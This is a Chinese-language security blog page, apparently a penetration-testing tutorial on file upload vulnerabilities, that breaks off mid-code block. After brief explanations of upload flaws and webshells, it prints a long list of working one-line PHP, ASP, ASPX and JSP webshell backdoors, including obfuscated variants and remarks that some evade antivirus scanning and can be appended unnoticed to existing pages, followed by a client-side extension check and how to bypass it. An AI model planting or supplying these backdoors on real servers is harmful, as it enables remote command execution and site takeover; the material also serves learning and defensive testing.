<!-- build time:Wed Jun 15 2022 17:00:30 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="Or0kit" href="https://or0kit.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="Or0kit" href="https://or0kit.github.io/atom.xml"><link rel="alternate" type="application/json" title="Or0kit" href="https://or0kit.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="文件上传"><link rel="canonical" href="https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><title>web漏洞-文件上传 - web安全 - 渗透测试 | Or0kit</title><meta name="generator" content="Hexo 5.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">web漏洞-文件上传</h1><div class="meta"><span class="item" title="创建时间：2021-01-12 22:14:02"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2021-01-12T22:14:02+08:00">2021-01-12</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>19k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>18 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Or0kit</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipetlbztpj20zk0m84qp.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitzannuj20zk0m8b29.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PenetrationTest/" itemprop="item" rel="index" title="分类于 渗透测试"><span itemprop="name">渗透测试</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/PenetrationTest/Web-Security/" itemprop="item" rel="index" title="分类于 web安全"><span itemprop="name">web安全</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="Or0kit"><meta itemprop="description" content=", 临渊羡鱼，不如退而结网"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Or0kit"></span><div class="body md" itemprop="articleBody"><h1 id="介绍文件上传漏洞"><a class="anchor" href="#介绍文件上传漏洞">#</a> 介绍文件上传漏洞</h1><blockquote><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p></blockquote><p>产生原因：</p><ul><li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li><li>对于上传文件的 MIMETYPE (用于描述文件的类型的一种表述方法) 没有做检查</li><li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于 shebang 类型的文件）</li><li>对于 web server 对于上传文件或者指定目录的行为没有做限制</li></ul><p>原理：</p><blockquote><p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p></blockquote><p>文件上传后导致的常见安全问题一般有:</p><p>上传文件是 Web 脚本语言，服务器的 Web 容器解释并执行了用户上传的脚本，导致代<br>码执行；</p><p>上传文件是 Flash 的策略文件 crossdomain.xml, 黑客用以控制 Flash 在该域下的行为 (其<br>他通过类似方式控制策略文件的情况类似);</p><p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p><p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</p><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块；或者上传 - 一个合法的文本文件， 其内容包含了 PHP 脚本，再通过 “本地文件包含漏洞 (Local File Include)&quot; 执行此脚本；等等。</p><h1 id="有关文件上传的知识"><a class="anchor" href="#有关文件上传的知识">#</a> 有关文件上传的知识</h1><h2 id="webshell"><a class="anchor" href="#webshell">#</a> webshell</h2><p>什么是 webshell<br>WebShell 就是以 asp、php、jsp 或者 cgi 等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些 asp 或 php 后门文件与网站服务器 web 目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell 后门隐蔽较性高，可以轻松穿越防火墙，访问 WebShell 时不会留下系统日志，只会在网站的 web 日志中留下一些数据提交记录</p><h2 id="一句话木马"><a class="anchor" href="#一句话木马">#</a> 一句话木马</h2><p>常用的 webshell 就是一句话木马，结合中国菜刀或者 hackbar 等工具可以很高效快捷的获得网站 shell。</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>##PHP：</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">//?cmd=phpinfo();</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">//print_r($new_array);</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num="25"></td><td><pre>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token comment">//?cmd=phpinfo()</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment">//?func=system&amp;cmd=whoami</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> php环境>=&lt;5.6才能用</pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  php环境>=5.6才能用</pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token operator">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//容错代码 </pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> </pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //绕过<span class="token php language-php"><span class="token delimiter important">&lt;?</span>限制的一句话</span></pre></td></tr><tr><td data-num="58"></td><td><pre></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php </span><span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</pre></td></tr><tr><td data-num="60"></td><td><pre></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system </span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </pre></td></tr><tr><td data-num="62"></td><td><pre>加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre>&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> </pre></td></tr><tr><td data-num="65"></td><td><pre>无防下载表，有防下载表可尝试插入以下语句突破的一句话 </pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre>&lt;%eval(request(“1″)):response.end%> 备份专用</pre></td></tr></table></figure><pre><code class="language-jsp">##JSP：
&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; 
提交客户端 
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;
</code></pre><pre><code class="language-asp">##ASP
&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;

&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; 

&lt;%execute(request(“1″))%&gt; 

&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用'&lt;,&gt;‘的asp一句话 
</code></pre><pre><code class="language-aspx">##aspx
&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; 

&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; 

&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。
</code></pre><h1 id="文件上传的攻击与防御方法"><a class="anchor" href="#文件上传的攻击与防御方法">#</a> 文件上传的攻击与防御方法</h1><h2 id="本地前端限制"><a class="anchor" href="#本地前端限制">#</a> 本地前端限制</h2><figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// 定义允许上传的文件类型</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">// 提取上传文件的类型</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token comment">// 判断上传文件类型是否允许上传</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="原理"><a class="anchor" href="#原理">#</a> 原理</h3><p>在表单中使用 onsumbit=checkFile () 调用 js 函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p><h3 id="绕过方法"><a class="anchor" href="#绕过方法">#</a> 绕过方法</h3><p>这种限制很简单，通过浏览器 F12 很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是 JS 脚本检测，在本地浏览器客户端禁用 JS 即可。可使用火狐浏览器的 NoScript 插件、IE 中禁用掉 JS 等方式实现绕过。</p><h3 id="操作方法"><a class="anchor" href="#操作方法">#</a> 操作方法</h3><p>准备一句话木马：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td 